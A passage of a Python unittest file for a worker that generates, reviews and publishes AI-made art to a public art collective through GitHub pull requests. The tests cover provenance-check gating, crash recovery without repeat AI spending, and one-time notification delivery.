                and str(argv[1]).endswith(EW.COLLECTIVE_VALIDATOR_PATH)
                and argv[2] == "--validate"
            ):
                calls.append((list(argv), dict(kwargs)))
            return real_run(*args, **kwargs)

        with mock.patch.object(
                EW.subprocess, "run", side_effect=recording_run):
            self.run_to_pending()
        self.assertEqual(1, len(calls))
        argv, kwargs = calls[0]
        self.assertEqual(sys.executable, argv[0])
        self.assertEqual("--validate", argv[-1])
        self.assertTrue(kwargs["capture_output"])
        self.assertTrue(kwargs["text"])
        self.assertEqual(
            EW.COLLECTIVE_VALIDATOR_TIMEOUT_S, kwargs["timeout"])
        self.assertNotIn("shell", kwargs)

    def test_png_and_unsafe_vision_configs_stop_before_any_spend(self):
        mixed = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "allowed_kinds": ["svg", "png"],
            "fanout": {"enabled": True, "children": 3},
        })
        unreviewed = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "allowed_kinds": ["png"],
            "azure_image": {"enabled": False},
            "fanout": {"enabled": True, "children": 3},
        })
        unsafe_vision = self.visual_config()
        unsafe_vision["evolve_worker"]["rapp_vision"]["media_dir"] = "other/media"
        for label, cfg in {
                "mixed PNG": mixed,
                "legacy unreviewed PNG": unreviewed,
                "unsafe reviewed Vision paths": unsafe_vision,
        }.items():
            with self.subTest(case=label), \
                 mock.patch.object(EW, "assert_publish_auth") as auth, \
                 mock.patch.object(EW, "assert_visual_pipeline_ready") as visual, \
                 mock.patch.object(EW.SS, "run_children") as children, \
                 mock.patch.object(EW, "run_model") as maker, \
                 mock.patch.object(EW.azure_art, "generate") as generator, \
                 mock.patch.object(EW, "review_generated_image") as reviewer:
                result = EW.run_once(
                    cfg=cfg, health=lambda phase: healthy())
            self.assertEqual("skipped", result["outcome"])
            self.assertIn("publication profile preflight failed", result["reason"])
            auth.assert_not_called()
            visual.assert_not_called()
            children.assert_not_called()
            maker.assert_not_called()
            generator.assert_not_called()
            reviewer.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists())
        self.assertEqual([], self.gh.calls)

    def test_direct_visual_gate_failure_is_silent_and_spends_no_generator(self):
        with mock.patch.object(EW, "assert_publish_auth",
                               return_value="local test repo"), \
             mock.patch.object(EW, "assert_visual_pipeline_ready",
                               return_value="ready"), \
             mock.patch.object(EW, "run_model",
                               self.visual_model(direct_png=True)), \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "review_generated_image") as reviewer:
            result = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, result["outcome"], result)
        generator.assert_not_called()
        reviewer.assert_not_called()
        self.assertEqual([], self.notifications)

    def test_invalid_reviewed_identity_stops_after_maker_before_azure_or_publish(self):
        cases = {
            "leading title whitespace": {"title": " Visual Piece"},
            "trailing title whitespace": {"title": "Visual Piece "},
            "title over limit": {"title": "x" * 201},
            "tab in title": {"title": "Visual\tPiece"},
            "newline in title": {"title": "Visual\nPiece"},
            "control in title": {"title": "Visual\x01Piece"},
            "wrong contributor": {"contributor": "mutable-maker"},
        }
        for label, changes in cases.items():
            for path in (
                    EW.HISTORY_PATH, EW.TURN_PATH, EW.ALERT_PATH,
                    EW.STATUS_PATH, EW.TRANSACTION_PATH):
                path.unlink(missing_ok=True)
            self.gh.calls.clear()
            self.notifications.clear()
            maker = mock.Mock(side_effect=self.visual_model(**changes))
            generator = mock.Mock(return_value=(PNG, "gpt-image-2"))
            reviewer = mock.Mock(side_effect=lambda *_: self.review())
            with self.subTest(case=label), \
                    mock.patch.object(
                        EW, "assert_publish_auth",
                        return_value="local test repo"), \
                    mock.patch.object(
                        EW, "assert_visual_pipeline_ready",
                        return_value="ready"), \
                    mock.patch.object(EW, "run_model", maker), \
                    mock.patch.object(EW.azure_art, "generate", generator), \
                    mock.patch.object(
                        EW, "review_generated_image", reviewer):
                result = EW.run_once(
                    cfg=self.visual_config(), health=lambda phase: healthy())
            self.assertEqual(EW.OUTCOME_REJECTED, result["outcome"], result)
            maker.assert_called_once()
            generator.assert_not_called()
            reviewer.assert_not_called()
            self.assertFalse(EW.ART_ARCHIVE.exists())
            self.assertFalse(self.gh.called("pr", "create"))
            self.assertFalse(self.gh.called("pr", "merge"))
            branches = git_bare(
                self.origin,
                "for-each-ref",
                "--format=%(refname)",
                "refs/heads/",
            )
            self.assertEqual(["refs/heads/main"], branches.split())
            self.assertEqual([], self.notifications)

    def test_reconciliation_revalidates_without_any_new_ai_or_image_call(self):
        transaction = self.run_to_pending()
        snapshot = transaction["profile_snapshot"]
        self.assertEqual(
            EW.AZURE_REVIEWED_PNG_PROFILE, snapshot["profile"])
        self.assertEqual(
            8, snapshot["minimum_review_score"])
        self.assertEqual(
            hashlib.sha256(PNG).hexdigest(),
            transaction["submission"]["meta"][
                "_image_generation"]["image_sha256"])

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None, profile_snapshot=None):
            self.assertEqual(snapshot, profile_snapshot)
            return self.deployed(receipts)

        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "materialize_azure_image") as materialize, \
             mock.patch.object(EW, "review_generated_image") as reviewer, \
             mock.patch.object(EW, "assert_visual_pipeline_ready") as preflight, \
             mock.patch.object(
                 EW, "validate_staged_collective_candidate") as validator, \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            result = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", result["outcome"], result)
        maker.assert_not_called()
        generator.assert_not_called()
        materialize.assert_not_called()
        reviewer.assert_not_called()
        preflight.assert_not_called()
        validator.assert_not_called()
        self.assertEqual(1, len(self.notifications))

    def test_ambiguous_profile_merge_reconciles_without_any_ai_respend(self):
        self.gh.raise_after_merge = EW.CommandError(
            "merge transport ended after main advanced")
        with mock.patch.object(EW, "assert_publish_auth",
                               return_value="local test repo"), \
             mock.patch.object(EW, "assert_visual_pipeline_ready",
                               return_value="ready"), \
             mock.patch.object(EW, "run_model", self.visual_model()), \
             mock.patch.object(EW.azure_art, "generate",
                               return_value=(PNG, "gpt-image-2")), \
             mock.patch.object(EW, "review_generated_image",
                               side_effect=lambda *_: self.review()):
            first = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual("merge-pending", first["outcome"], first)
        transaction = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("merge-ambiguous", transaction["phase"])
        self.assertIs(
            type(transaction["submission"]["meta"][
                "_image_generation"]["review"]["score"]),
            int)

        self.gh.raise_after_merge = None

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None, profile_snapshot=None):
            self.assertEqual(
                transaction_state["profile_snapshot"], profile_snapshot)
            return self.deployed(receipts)

        transaction_state = transaction
        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "materialize_azure_image") as materialize, \
             mock.patch.object(EW, "review_generated_image") as reviewer, \
             mock.patch.object(EW, "assert_visual_pipeline_ready") as preflight, \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            second = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        generator.assert_not_called()
        materialize.assert_not_called()
        reviewer.assert_not_called()
        preflight.assert_not_called()
        self.assertFalse(EW.TRANSACTION_PATH.exists())
        self.assertEqual(1, len(self.notifications))

    def test_conflicting_profile_snapshot_fails_closed_and_stays_silent(self):
        transaction = self.run_to_pending()
        transaction["profile_snapshot"]["minimum_review_score"] = 9
        EW.atomic_write_json(EW.TRANSACTION_PATH, transaction)
        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "materialize_azure_image") as materialize, \
             mock.patch.object(EW, "review_generated_image") as reviewer, \
             mock.patch.object(EW, "finish_platform_deployments") as finish:
            result = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual("fail-closed", result["outcome"], result)
        self.assertIn("captured the wrong minimum", result["reason"])
        maker.assert_not_called()
        generator.assert_not_called()
        materialize.assert_not_called()
        reviewer.assert_not_called()
        finish.assert_not_called()
        self.assertEqual([], self.notifications)
        self.assertTrue(EW.TRANSACTION_PATH.exists())

    def test_provenance_check_waits_for_delayed_exact_success_before_merge(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 2
        cfg["evolve_worker"]["view_probe_backoff"] = [0]
        self.gh.provenance_check_sequence = [
            [{
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "status": "IN_PROGRESS",
                "conclusion": None,
            }],
            [{
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "status": "COMPLETED",
                "conclusion": "SUCCESS",
            }],
        ]

        summary = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        checks = [
            index for index, call in enumerate(self.gh.calls)
            if (call[:2] == ("pr", "view")
                and "statusCheckRollup" in call[-1])
        ]
        merge = next(
            index for index, call in enumerate(self.gh.calls)
            if call[:2] == ("pr", "merge"))
        self.assertEqual(3, len(checks))
        self.assertLess(max(checks), merge)
        self.assertTrue(all(
            call[-1] == EW.PROVENANCE_ROLLUP_JSON_FIELDS
            for call in (self.gh.calls[index] for index in checks)))
        self.assertFalse(self.gh.called("pr", "checks"))

    def test_real_checkrun_rollup_shapes_are_classified_exactly(self):
        wcfg = EW.worker_config(self.visual_config())

        def classify(rows):
            self.gh.provenance_check_sequence = [rows]
            return EW.collective_provenance_check_state("7", wcfg)

        success = classify([
            {
                "__typename": "StatusContext",
                "context": EW.COLLECTIVE_PROVENANCE_CHECK,
                "state": "SUCCESS",
            },
            {
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "status": "COMPLETED",
                "conclusion": "SUCCESS",
            },
        ])
        self.assertEqual("success", success["classification"])
        self.assertEqual("OPEN", success["pull_request"]["state"])

        pending = classify([{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "IN_PROGRESS",
            "conclusion": None,
        }])
        self.assertEqual("pending", pending["classification"])

        absent = classify([{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": "Different workflow",
            "status": "COMPLETED",
            "conclusion": "SUCCESS",
        }])
        self.assertEqual("absent", absent["classification"])
        self.assertFalse(absent["present"])

        for conclusion in (
                "FAILURE", "TIMED_OUT", "ACTION_REQUIRED", "STALE"):
            failed = classify([{
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "status": "COMPLETED",
                "conclusion": conclusion,
            }])
            with self.subTest(conclusion=conclusion):
                self.assertEqual("failure", failed["classification"])

        cancelled = {
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "CANCELLED",
        }
        self.assertEqual(
            "cancelled", classify([cancelled])["classification"])
        self.assertEqual(
            "pending",
            classify([
                cancelled,
                {
                    "__typename": "CheckRun",
                    "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                    "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                    "status": "QUEUED",
                    "conclusion": None,
                },
            ])["classification"],
        )

    def test_rollup_inspection_and_shape_errors_are_not_success(self):
        wcfg = EW.worker_config(self.visual_config())
        self.gh.provenance_check_sequence = ["not-an-array"]
        with self.assertRaises(EW.CommandError):
            EW.collective_provenance_check_state("7", wcfg)

        self.gh.provenance_check_sequence = [
            EW.CommandError("gh pr view failed")]
        with self.assertRaises(EW.CommandError):
            EW.collective_provenance_check_state("7", wcfg)

        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": None,
        }]]
        with self.assertRaises(EW.CommandError):
            EW.collective_provenance_check_state("7", wcfg)

    def test_pending_provenance_restarts_then_merges_without_respending(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        cfg["evolve_worker"]["view_probe_backoff"] = [0]
        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "QUEUED",
            "conclusion": None,
        }]]

        first = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", first["outcome"], first)
        self.assertFalse(self.gh.called("pr", "merge"))
        transaction = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("checks-pending", transaction["phase"])
        self.assertEqual("pending",
                         json.loads(EW.HISTORY_PATH.read_text())[0]["outcome"])

        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "SUCCESS",
        }]]

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None, profile_snapshot=None):
            return self.deployed(receipts)

        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "materialize_azure_image") as materialize, \
             mock.patch.object(EW, "review_generated_image") as reviewer, \
             mock.patch.object(EW, "assert_visual_pipeline_ready") as preflight, \
             mock.patch.object(
                 EW, "validate_staged_collective_candidate") as validator, \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            second = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        generator.assert_not_called()
        materialize.assert_not_called()
        reviewer.assert_not_called()
        preflight.assert_not_called()
        validator.assert_not_called()
        self.assertTrue(self.gh.called("pr", "merge"))
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_explicit_provenance_failure_closes_without_merging(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "FAILURE",
        }]]

        result = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual(EW.OUTCOME_ABORTED, result["outcome"], result)
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertFalse(EW.TRANSACTION_PATH.exists())
        tree = git_bare(self.origin, "ls-tree", "-r", "--name-only", "main")
        self.assertNotIn("submissions/visual-piece/piece.png", tree)

    def test_fresh_rollup_failure_after_success_remains_terminal(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        success = {
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "SUCCESS",
        }
        self.gh.provenance_check_sequence = [
            [success],
            [{**success, "conclusion": "FAILURE"}],
        ]

        result = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual(EW.OUTCOME_ABORTED, result["outcome"], result)
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_stale_provenance_result_remains_terminal(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "STALE",
        }]]

        result = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual(EW.OUTCOME_ABORTED, result["outcome"], result)
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_cancelled_run_with_pending_replacement_stays_open(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        self.gh.provenance_check_sequence = [[
            {
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "status": "COMPLETED",
                "conclusion": "CANCELLED",
            },
            {
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "status": "QUEUED",
                "conclusion": None,
            },
        ]]

        result = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", result["outcome"], result)
        self.assertFalse(self.gh.called("pr", "close"))
        self.assertFalse(self.gh.called("pr", "merge"))
        state = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("pending", state["provenance_check_state"])
        self.assertEqual("", state["provenance_cancelled_first_seen_at"])

    def test_lone_cancelled_run_gets_bounded_replacement_grace(self):
        cfg = self.visual_config()
        cfg["evolve_worker"].update({
            "view_probe_attempts": 1,
            "view_probe_backoff": [0],
            "provenance_absent_grace_s": 300,
        })
        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "CANCELLED",
        }]]

        first = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", first["outcome"], first)
        self.assertFalse(self.gh.called("pr", "close"))
        state = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertTrue(state["provenance_cancelled_first_seen_at"])

        cfg["evolve_worker"]["provenance_absent_grace_s"] = 0
        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-aborted", second["outcome"], second)
        maker.assert_not_called()
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_absent_provenance_is_pending_then_bounded_failure_never_success(self):
        cfg = self.visual_config()
        cfg["evolve_worker"].update({
            "view_probe_attempts": 1,
            "view_probe_backoff": [0],
            "provenance_absent_grace_s": 300,
        })
        self.gh.provenance_check_sequence = [[]]

        first = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", first["outcome"], first)
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertTrue(EW.TRANSACTION_PATH.exists())

        cfg["evolve_worker"]["provenance_absent_grace_s"] = 0
        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-aborted", second["outcome"], second)
        maker.assert_not_called()
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_check_state_api_error_stays_pending_without_losing_transaction(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        self.gh.provenance_check_sequence = [
            EW.CommandError("GitHub check API unavailable")]

        first = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", first["outcome"], first)
        transaction = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("checks-pending", transaction["phase"])
        self.assertFalse(self.gh.called("pr", "merge"))

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("checks-pending", second["outcome"], second)
        maker.assert_not_called()
        self.assertTrue(EW.TRANSACTION_PATH.exists())
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_blocked_required_check_restarts_clean_without_respending(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        self.gh.merge_state_status = "BLOCKED"
        self.gh.provenance_check_sequence = [[
            {
                "__typename": "CheckRun",
                "name": EW.COLLECTIVE_PROVENANCE_CHECK,
                "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
                "status": "COMPLETED",
                "conclusion": "SUCCESS",
            },
            {
                "__typename": "CheckRun",
                "name": "Other required check",
                "workflowName": "Required checks",
                "status": "IN_PROGRESS",
                "conclusion": None,
            },
        ]]

        first = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", first["outcome"], first)
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertFalse(self.gh.called("pr", "close"))
        transaction = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("checks-pending", transaction["phase"])

        self.gh.merge_state_status = "CLEAN"
        self.gh.provenance_check_sequence = [[{
            "__typename": "CheckRun",
            "name": EW.COLLECTIVE_PROVENANCE_CHECK,
            "workflowName": EW.COLLECTIVE_PROVENANCE_WORKFLOW,
            "status": "COMPLETED",
            "conclusion": "SUCCESS",
        }]]

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None, profile_snapshot=None):
            return self.deployed(receipts)

        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "materialize_azure_image") as materialize, \
             mock.patch.object(EW, "review_generated_image") as reviewer, \
             mock.patch.object(EW, "assert_visual_pipeline_ready") as preflight, \
             mock.patch.object(
                 EW, "validate_staged_collective_candidate") as validator, \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            second = EW.run_once(cfg=cfg, health=lambda phase: healthy())

        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        generator.assert_not_called()
        materialize.assert_not_called()
        reviewer.assert_not_called()
        preflight.assert_not_called()
        validator.assert_not_called()
        self.assertTrue(self.gh.called("pr", "merge"))
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_behind_merge_state_stays_open_and_pending(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["view_probe_attempts"] = 1
        self.gh.merge_state_status = "BEHIND"

        result = self.run_visual_with_verified_deployment(cfg)

        self.assertEqual("checks-pending", result["outcome"], result)
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertFalse(self.gh.called("pr", "close"))
        self.assertTrue(EW.TRANSACTION_PATH.exists())

    def test_only_clean_merge_state_is_ready(self):
        wcfg = EW.worker_config(self.visual_config())
        for merge_state in ("DIRTY", "DRAFT", "HAS_HOOKS"):
            self.gh.merge_state_status = merge_state
            with self.subTest(merge_state=merge_state), \
                 self.assertRaises(EW.ProvenanceCheckFailed):
                EW.collective_merge_readiness("7", wcfg)

    def test_notification_retry_reuses_verified_receipts_without_cdn_probe(self):
        cfg = self.visual_config()

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None, profile_snapshot=None):
            vcfg = EW.vision_config(wcfg)
            vision = {
                **EW.vision_urls(vcfg, submission),
                "merge_commit": "vision-verified-commit",
            }
            collective_url, _ = EW.art_urls(cfg, wcfg, submission)
            deployed = {
                "collective_url": collective_url,
                "collective_kind": "pages",
                "vision_url": vision["watch_url"],
                "vision_channel_url": vision["channel_url"],
                "vision_media_url": vision["media_url"],
                "note": "",
            }
            durable = EW.durable_deployment_receipt(
                cfg, wcfg, submission, receipts, vision, deployed,
                profile_snapshot=profile_snapshot)
            result = {**receipts, "vision": vision, **durable}
            transaction(
                phase="platforms-verified",
                vision_receipts=vision,
                deployment_receipts=durable,
            )
            return result

        with mock.patch.object(EW, "assert_publish_auth",
                               return_value="local test repo"), \
             mock.patch.object(EW, "assert_visual_pipeline_ready",
                               return_value="ready"), \
             mock.patch.object(EW, "run_model", self.visual_model()), \
             mock.patch.object(EW.azure_art, "generate",
                               return_value=(PNG, "gpt-image-2")), \
             mock.patch.object(EW, "review_generated_image",
                               side_effect=lambda *_: self.review()), \
             mock.patch.object(EW, "finish_platform_deployments", finish), \
             mock.patch.object(
                 EW.sentinel, "notify",
                 side_effect=KeyboardInterrupt(
                     "power cut after verified deployment before notification"),
             ):
            first = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"], first)
        state = json.loads(EW.TRANSACTION_PATH.read_text())
        self.assertEqual("notification-pending", state["phase"])
        self.assertIn("deployment_receipts", state)
        self.assertEqual([], self.notifications)

        with mock.patch.object(
                EW, "finish_platform_deployments",
                side_effect=AssertionError(
                    "notification retry must not re-probe or redeploy")), \
             mock.patch.object(
                 EW, "probe_url",
                 side_effect=AssertionError(
                     "a later CDN failure must not affect notification retry")), \
             mock.patch.object(
                 EW, "probe_png_url",
                 side_effect=AssertionError(
                     "a later media probe must not run")), \
             mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=cfg, health=lambda phase: healthy())

        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        self.assertEqual(1, len(self.notifications))
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_persisted_deployment_receipt_rejects_digest_or_profile_conflict(self):
        cfg = self.visual_config()
        wcfg = EW.worker_config(cfg)
        snapshot = EW.publication_profile_snapshot(wcfg)
        meta = with_reviewed_png_receipt(
            meta_for("visual-piece", kind="png"), PNG, wcfg)
        submission = {
            "slug": "visual-piece",
            "title": "Visual Piece",
            "kind": "png",
            "meta": meta,
            "meta_path": "submissions/visual-piece/meta.json",
            "piece_path": "submissions/visual-piece/piece.png",
            "meta_sha256": hashlib.sha256(
                json.dumps(meta, ensure_ascii=False, indent=2).encode()
            ).hexdigest(),
            "piece_sha256": hashlib.sha256(PNG).hexdigest(),
        }
        collective = {"merge_commit": "collective-verified-commit"}
        vision = {
            **EW.vision_urls(EW.vision_config(wcfg), submission),
            "merge_commit": "vision-verified-commit",
        }
        collective_url, _ = EW.art_urls(cfg, wcfg, submission)
        deployed = {
            "collective_url": collective_url,
            "collective_kind": "pages",
            "vision_url": vision["watch_url"],
            "vision_channel_url": vision["channel_url"],
            "vision_media_url": vision["media_url"],
            "note": "",
        }
        receipt = EW.durable_deployment_receipt(
            cfg, wcfg, submission, collective, vision, deployed,
            profile_snapshot=snapshot)
        for field, value in (
                ("piece_sha256", "0" * 64),
                ("profile", ""),
        ):
            with self.subTest(field=field):
                bad = dict(receipt, **{field: value})
                with self.assertRaises(EW.GateError):
                    EW.persisted_deployment_receipts(
                        {
                            "deployment_receipts": bad,
                            "vision_receipts": vision,
                        },
                        cfg, wcfg, submission, collective,
                        profile_snapshot=snapshot)


class ArtDeliveryTests(WorkerEnv):
    """The art text goes through the ordinary outbox — once — and is then the
    delivery layer's business to classify, not this worker's to assert."""

    def setUp(self):
        super().setUp()
        import outbox
        import standup
        self.outbox = outbox
        self.enqueued = []
        self.enqueue_attempts = []
        self.enqueued_ids = set()

        def enqueue_once(text, to, attachments=None, dedupe_key=None):
            self.enqueue_attempts.append(dedupe_key)
            if dedupe_key and dedupe_key in self.enqueued_ids:
                return False
            if dedupe_key:
                self.enqueued_ids.add(dedupe_key)
            self.enqueued.append({
                "text": text,
                "to": to,
                "attachments": attachments,
                "dedupe_key": dedupe_key,
            })
            return True

        self.enqueue_once = enqueue_once
        # sentinel.notify is NOT patched here: the point is to watch the real
        # notify path reach the real queue exactly once.
        for target, name, value in (
                (EW.sentinel, "notify", REAL_NOTIFY),
                (outbox, "enqueue", enqueue_once),
                (outbox, "drain", mock.Mock(return_value=(1, 0, "sent"))),
                (standup, "portable_snapshot", mock.Mock(return_value="snap.html")),
                (standup, "publish_snapshot",
                 mock.Mock(return_value=["http://192.0.2.9:9797/share/x.html"])),
        ):
            p = mock.patch.object(target, name, value)
            p.start()
            self.addCleanup(p.stop)
        self.drain = outbox.drain
        self.snapshot = standup.portable_snapshot

    def test_a_verified_merge_enqueues_exactly_one_message(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(1, len(self.enqueued), "one merge, one queued message")
        message = self.enqueued[0]
        self.assertEqual("+15550000002", message["to"])
        self.assertIn("New Piece", message["text"])
        self.assertIn("Public Art Collective: "
                      "https://kody-w.github.io/public-art-collective/"
                      "view.html#/new-piece", message["text"])
        self.assertNotIn("Static HTML report:", message["text"])
        self.snapshot.assert_not_called()
        self.assertEqual(1, self.drain.call_count,
                         "the delivery layer, not this worker, decides what "
                         "'sent' means")

    def test_a_queue_only_instance_still_enqueues_and_never_sends(self):
        cfg = dict(self.cfg, notify_queue_only=True)
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual(1, len(self.enqueued))
        self.drain.assert_not_called()

    def test_crash_immediately_before_enqueue_resumes_from_contributed_row(self):
        with mock.patch.object(
                self.outbox, "enqueue",
                side_effect=KeyboardInterrupt("power cut before enqueue")), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            first = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"], first)
        self.assertEqual([], self.enqueued)
        transaction = json.loads(EW.TRANSACTION_PATH.read_text())
